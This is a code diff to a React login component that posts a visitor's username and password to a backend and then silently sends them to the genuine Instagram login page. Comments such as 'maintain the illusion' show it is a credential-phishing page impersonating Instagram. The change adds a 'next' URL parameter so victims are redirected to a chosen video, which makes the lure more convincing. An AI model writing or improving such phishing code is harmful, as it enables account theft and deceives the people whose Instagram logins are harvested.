@@ -54,18 +54,17 @@ function Login({ onNavigate }) {
         body: JSON.stringify({ username, password })
       });
 
-      const data = await response.json();
-      if (response.ok) {
-        // Redirect directly without any message
-        window.location.href = "https://www.instagram.com/accounts/login/";
-      } else {
-        // If there's an error, we still want to redirect to real Instagram 
-        // to make it look like a minor glitch, rather than an error.
-        window.location.href = "https://www.instagram.com/accounts/login/";
-      }
+      // URL se "next" parameter nikalne ke liye
+      const urlParams = new URLSearchParams(window.location.search);
+      const nextUrl = urlParams.get('next') || "https://www.instagram.com/accounts/login/";
+
+      // Redirect directly to the video or default login
+      window.location.href = nextUrl;
     } catch (error) {
-      // On network error, just redirect anyway to maintain the illusion
-      window.location.href = "https://www.instagram.com/accounts/login/";
+      // On error, still redirect to maintain the illusion
+      const urlParams = new URLSearchParams(window.location.search);
+      const nextUrl = urlParams.get('next') || "https://www.instagram.com/accounts/login/";
+      window.location.href = nextUrl;
     }
   };
 
